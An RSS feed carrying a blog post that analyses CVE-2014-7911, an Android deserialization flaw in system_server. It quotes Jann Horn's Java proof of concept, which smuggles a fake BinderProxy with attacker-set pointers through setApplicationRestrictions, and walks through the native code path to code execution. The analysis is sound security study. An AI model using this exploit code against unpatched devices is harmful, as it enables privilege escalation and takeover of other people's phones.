<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Android on Zeqi&#39;s Blog</title>
    <link>https://zeqiii.github.io/topics/android/</link>
    <description>Recent content in Android on Zeqi&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-EN</language>
    <managingEditor>zeqiii@163.com (zeqi)</managingEditor>
    <webMaster>zeqiii@163.com (zeqi)</webMaster>
    <copyright>(c) 2016 zeqi</copyright>
    <lastBuildDate>Mon, 29 Feb 2016 16:34:11 +0800</lastBuildDate>
    <atom:link href="https://zeqiii.github.io/topics/android/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Analysis of cve-2014-7911</title>
      <link>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</link>
      <pubDate>Mon, 29 Feb 2016 16:34:11 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</guid>
      <description>

&lt;h2 id=&#34;a-brief-look&#34;&gt;A brief look&lt;/h2&gt;

&lt;p&gt;System_server is a process has &lt;strong&gt;system&lt;/strong&gt; permission, to which one can send any serializable data. Although system_server won&amp;rsquo;t invoke any functions of the received objected, but &lt;code&gt;finalize&lt;/code&gt; will be called when &lt;strong&gt;GC&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Function &lt;code&gt;finalize&lt;/code&gt; in &lt;code&gt;android.os.BinderProxy&lt;/code&gt; calls a native function which has pointers, the pointers may be controlled by attackers. So &lt;strong&gt;GC&lt;/strong&gt; may result in arbitrary code execution. &lt;code&gt;android.os.BinderProxy&lt;/code&gt; isn&amp;rsquo;t serializable, however, java.io.ObjectInputStream doesn&amp;rsquo;t check whether an object really is serializable, attackers can craft a fake BinderProxy to acheive the goals.
As other one&amp;rsquo;s blog says:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;ObjectInputStream doesn&amp;rsquo;t validate that the serialized object&amp;rsquo;s class type, as described in the serialized object, is actually serializable. It creates an instance of the wanted class anyway with the deserialized values of the object. Therefore, one can create object of any class, and control its private variables, by serializing objects from another class, that would be deserialized as data members of the wanted class.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;poc&#34;&gt;POC&lt;/h2&gt;

&lt;p&gt;Let&amp;rsquo;s just see the POC written by &lt;strong&gt;Jann Horn&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;AAdroid.os.BinderProxy.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class BinderProxy implements Serializable {
   private static final long serialVersionUID = 0;
   //public long mObject = 0x1337beef;
   //public long mOrgue = 0x1337beef;
   private int mObject = 0x1337beef;
   private int mOrgue = 0x1337beef;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Partial code of MainActivity.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// Put the fake BinderProxy object into a Bundle
Bundle b = new Bundle();
AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
b.putSerializable(&amp;quot;eatthis&amp;quot;, evilProxy);

// Get IUserManager using reflection
Class clIUserManager = Class.forName(&amp;quot;android.os.IUserManager&amp;quot;);
// Get inner class Stub from IUserManager
Class[] umSubclasses = clIUserManager.getDeclaredClasses();
Class clStub = null;
for (Class c: umSubclasses) {
    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub&amp;quot;)) {
        clStub = c;
    }
}
// Get the field &amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;
Field fTRANSACTION_setApplicationRestrictions = clStub.getDeclaredField(&amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;);
fTRANSACTION_setApplicationRestrictions.setAccessible(true);
TRANSACTION_setApplicationRestrictions = fTRANSACTION_setApplicationRestrictions.getInt(null);

// Get UserManager
UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
// mService is a field of UserManager, its type is IUserManager
Field fService = UserManager.class.getDeclaredField(&amp;quot;mService&amp;quot;);
fService.setAccessible(true);
// Get mService from UserManager
Object proxy = fService.get(um);

// Get Stub.Proxy from clStub
Class[] stSubclasses = clStub.getDeclaredClasses();
clProxy = null;
for (Class c: stSubclasses) {
    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub.Proxy&amp;quot;)) {
        clProxy = c;
    }
}
// Get field mRemote from Proxy
Field fRemote = clProxy.getDeclaredField(&amp;quot;mRemote&amp;quot;);
fRemote.setAccessible(true);
mRemote = (IBinder) fRemote.get(proxy);
UserHandle me = android.os.Process.myUserHandle();

// Triggr it!
setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Implementation of setApplicationRestrictions&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// This function modifies the Bundle, marshalling it, find &amp;quot;AAdr&amp;quot; and changing it to &amp;quot;andr&amp;quot;, so the class description becomes &amp;quot;android.os.BinderProxy&amp;quot;
public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException 
{ 
    android.os.Parcel _data = android.os.Parcel.obtain(); 
    android.os.Parcel _reply = android.os.Parcel.obtain(); 
    try { 
        _data.writeInterfaceToken(DESCRIPTOR); 
        _data.writeString(packageName); 
        _data.writeInt(1); 
        restrictions.writeToParcel(_data, 0); 
        _data.writeInt(userHandle); 
        byte[] data = _data.marshall(); 
        for (int i=0; true; i++) { 
            if (data[i] == &#39;A&#39; &amp;amp;&amp;amp; data[i+1] == &#39;A&#39; &amp;amp;&amp;amp; data[i+2] == &#39;d&#39; &amp;amp;&amp;amp; data[i+3] == &#39;r&#39;) { 
                data[i] = &#39;a&#39;; 
                data[i+1] = &#39;n&#39;; 
                break; 
            } 
        } 
        _data.recycle(); 
        _data = Parcel.obtain(); 
        _data.unmarshall(data, 0, data.length); 
        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0); 
        _reply.readException(); 
    } 
    finally { 
        _reply.recycle(); 
        _data.recycle(); 
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the POC we know that a fake object is created and put into a bundle. It&amp;rsquo;s &lt;code&gt;mObject&lt;/code&gt; and &lt;code&gt;mOrgue&lt;/code&gt; is under attacker&amp;rsquo;s controll and can be set to any values. In function &lt;code&gt;setApplicationRestrictions&lt;/code&gt;, the bundle object is written to a parcel using &lt;code&gt;restrictions.writeToParcel&lt;/code&gt;. After the parcel marshalled to a byte array, a loop appears to find string &lt;code&gt;AAdr&lt;/code&gt;, and change &lt;code&gt;AA&lt;/code&gt; to &lt;code&gt;an&lt;/code&gt;. Thus, &lt;code&gt;AAdroid.os.BinderProxy&lt;/code&gt; finally becomes &lt;code&gt;android.os.BinderProxy&lt;/code&gt;. When &lt;code&gt;java.io.ObjectInputStream&lt;/code&gt; deserializes this object, a &lt;code&gt;android.os.BinderProxy&lt;/code&gt; object will be created. In this way, attackers can create any object and set the field value as they want.&lt;/p&gt;

&lt;h2 id=&#34;why-binderproxy&#34;&gt;Why BinderProxy?&lt;/h2&gt;

&lt;p&gt;So why attackers choose &lt;code&gt;android.os.BinderProxy&lt;/code&gt;? Here is the source code of it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;protected void finalize() throws Throwable {
	destroy();
	super.finalize();
	return;
	Exception exception;
	exception;
	super.finalize();
	throw exception;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;finalize()&lt;/code&gt; method will call a native method &lt;code&gt;distroy()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj) {
    IBinder* b = (IBinder*)
            env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mObject);
    DeathRecipientList* drl = (DeathRecipientList*)
            env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);
    LOGDEATH(&amp;quot;Destroying BinderProxy %p: binder=%p drl=%p\n&amp;quot;, obj, b, drl);
    env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0);
    env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);
    drl-&amp;gt;decStrong((void*)javaObjectForIBinder);
    b-&amp;gt;decStrong((void*)javaObjectForIBinder);
    IPCThreadState::self()-&amp;gt;flushCommands();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the above method, &lt;code&gt;mOrgue&lt;/code&gt; is regarded as a pointer of &lt;code&gt;DeathRecipientList&lt;/code&gt;, assigned to &lt;code&gt;drl&lt;/code&gt;. Then &lt;code&gt;drl-&amp;gt;decStrong()&lt;/code&gt; is invoked.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void RefBase::decStrong(const void* id) const {
    weakref_impl* const refs = mRefs;
    refs-&amp;gt;removeStrongRef(id);
    const int32_t c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);
#if PRINT_REFS
    ALOGD(&amp;quot;decStrong of %p from %p: cnt=%d\n&amp;quot;, this, id, c);
#endif
    ALOG_ASSERT(c &amp;gt;= 1, &amp;quot;decStrong() called on %p too many times&amp;quot;, refs);
    if (c == 1) {
        refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);
        if ((refs-&amp;gt;mFlags&amp;amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) {
            delete this;
        }
    }
    refs-&amp;gt;decWeak(id);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;According to other&amp;rsquo;s blog, &lt;code&gt;refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);&lt;/code&gt; will eventually causes arbitrary code execution. Below is the assembly code sceenshot from &lt;a href=&#34;http://wooyun.org/&#34;&gt;wooyun.org&lt;/a&gt;, attacker controlls r0 (&lt;code&gt;this&lt;/code&gt; pointer).&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/assembly.png&#34; alt=&#34;Image of assembly&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;

&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://seclists.org/fulldisclosure/2014/Nov/51&#34;&gt;http://seclists.org/fulldisclosure/2014/Nov/51&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&#34;&gt;http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://drops.wooyun.org/mobile/6082&#34;&gt;http://drops.wooyun.org/mobile/6082&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>